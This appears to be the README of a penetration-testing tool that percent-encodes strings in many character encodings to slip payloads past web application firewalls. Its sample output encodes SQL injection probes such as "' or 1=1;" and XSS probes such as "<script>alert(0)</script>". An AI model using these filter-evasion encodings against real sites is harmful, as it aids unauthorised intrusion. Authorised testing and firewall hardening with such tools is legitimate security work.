# Overview

Convert strings to various encodings and force percent encoding on each byte. Useful for producing payloads for WAF bypasses.

# Usage

- meaningful output is sent to `stdout`, everything else is sent to `stderr`
- can encode a single string or each string in one or more files
- can encode using one, multiple, or all encoders
- can look up the encoder for an encoded value from a string or strings in one or more files

## Rational Output

Can pipe actionable output to files without capturing alerts:

```
archangel@iron:percent_encoding_generator~> ./generator.py -i sample_files/*.txt -a > payloads.txt
[+] Encoding lines from files
[+] Failed encoding for: cp864
Error Message: 'charmap' codec can't encode character '\x25' in position 0: character maps to <undefined>
[+] Done!
archangel@iron:percent_encoding_generator~> head payloads.txt
%5a
%7f
%7b
%5b
%6c
%50
%7d
%4d
%5d
%5c
```

## Encoding a String

Encoding a single payload as `utf_8` and `utf_16`:

```
archangel@iron:percent_encoding_generator~> ./generator.py -s "' or 1=1;" -e utf_16 utf_8
[+] Encoding (no leading/trailing quotes): '' or 1=1;'
%ff%fe%27%00%20%00%6f%00%72%00%20%00%31%00%3d%00%31%00%3b%00
%27%20%6f%72%20%31%3d%31%3b
[+] Done!
```

Encoding a single payload with all Python encodings:

```
archangel@iron:percent_encoding_generator~> ./generator.py -s "' or 1=1;" -a
[+] Encoding (no leading/trailing quotes): '' or 1=1;'
%7d%40%96%99%40%f1%7e%f1%5e
%27%20%6f%72%20%31%3d%31%3b
%00%27%00%20%00%6f%00%72%00%20%00%31%00%3d%00%31%00%3b
%27%00%00%00%20%00%00%00%6f%00%00%00%72%00%00%00%20%00%00%00%31%00%00%00%3d%00%00%00%31%00%00%00%3b%00%00%00
%ff%fe%00%00%27%00%00%00%20%00%00%00%6f%00%00%00%72%00%00%00%20%00%00%00%31%00%00%00%3d%00%00%00%31%00%00%00%3b%00%00%00
%00%00%00%27%00%00%00%20%00%00%00%6f%00%00%00%72%00%00%00%20%00%00%00%31%00%00%00%3d%00%00%00%31%00%00%00%3b
%ff%fe%27%00%20%00%6f%00%72%00%20%00%31%00%3d%00%31%00%3b%00
%27%00%20%00%6f%00%72%00%20%00%31%00%3d%00%31%00%3b%00
[+] Done!
```

## Encoding Strings from Files

Encoding all strings from a single file:

```
archangel@iron:percent_encoding_generator~> ./generator.py -i sqli.txt -e utf_16
[+] Encoding lines from files
%ff%fe%27%00%20%00%4f%00%52%00%20%00%31%00%3d%00%31%00%3b%00
%ff%fe%29%00%20%00%41%00%4e%00%44%00%20%00%34%00%34%00%34%00%3c%00%35%00%35%00%35%00%20%00%4f%00%52%00%44%00%45%00%52%00%20%00%42%00%59%00%20%00%37%00%3b%00
[+] Done!
```

Encoding all strings from multiple files:

```
archangel@iron:percent_encoding_generator~> ./generator.py -i *.txt -e utf_16
[+] Encoding lines from files
%ff%fe%21%00
%ff%fe%22%00
%ff%fe%23%00
%ff%fe%24%00
%ff%fe%25%00
%ff%fe%26%00
%ff%fe%27%00
%ff%fe%28%00
%ff%fe%29%00
%ff%fe%2a%00
%ff%fe%2b%00
%ff%fe%2c%00
%ff%fe%2d%00
%ff%fe%2e%00
%ff%fe%2f%00
%ff%fe%3a%00
%ff%fe%3b%00
%ff%fe%3c%00
%ff%fe%3d%00
%ff%fe%3e%00
%ff%fe%3f%00
%ff%fe%40%00
%ff%fe%5b%00
%ff%fe%5c%00
%ff%fe%5d%00
%ff%fe%5e%00
%ff%fe%5f%00
%ff%fe%60%00
%ff%fe%7b%00
%ff%fe%7c%00
%ff%fe%7d%00
%ff%fe%7e%00
%ff%fe%27%00%20%00%4f%00%52%00%20%00%31%00%3d%00%31%00%3b%00
%ff%fe%29%00%20%00%41%00%4e%00%44%00%20%00%34%00%34%00%34%00%3c%00%35%00%35%00%35%00%20%00%4f%00%52%00%44%00%45%00%52%00%20%00%42%00%59%00%20%00%37%00%3b%00
%ff%fe%3c%00%73%00%63%00%72%00%69%00%70%00%74%00%3e%00%61%00%6c%00%65%00%72%00%74%00%28%00%30%00%29%00%3c%00%2f%00%73%00%63%00%72%00%69%00%70%00%74%00%3e%00
%ff%fe%3c%00%69%00%6d%00%67%00%20%00%73%00%72%00%63%00%3d%00%22%00%6a%00%61%00%76%00%61%00%73%00%63%00%72%00%69%00%70%00%74%00%3a%00%61%00%6c%00%65%00%72%00%74%00%28%00%30%00%29%00%22%00%3e%00                                                                                                                                                                                             
[+] Done!
```

## Looking up a String

Should an encoded value of interest be observed, simply pass that value to the `-l` flag to look up the corresponding value. This is useful only if the proper string or input files are supplied to `-s` or `-i` respectively.

```
archangel@iron:percent_encoding_generator~> ./generator.py -i *.txt -l %ff%fe%27%00%20%00%4f%00%52%00%20%00%31%00%3d%00%31%00%3b%00 -c
[+] Encoding lines from files
[+] Failed encoding for: cp864
Error Message: 'charmap' codec can't encode character '\x25' in position 0: character maps to <undefined>
[+] Common Encodings:
utf_16
[+] Done!
```
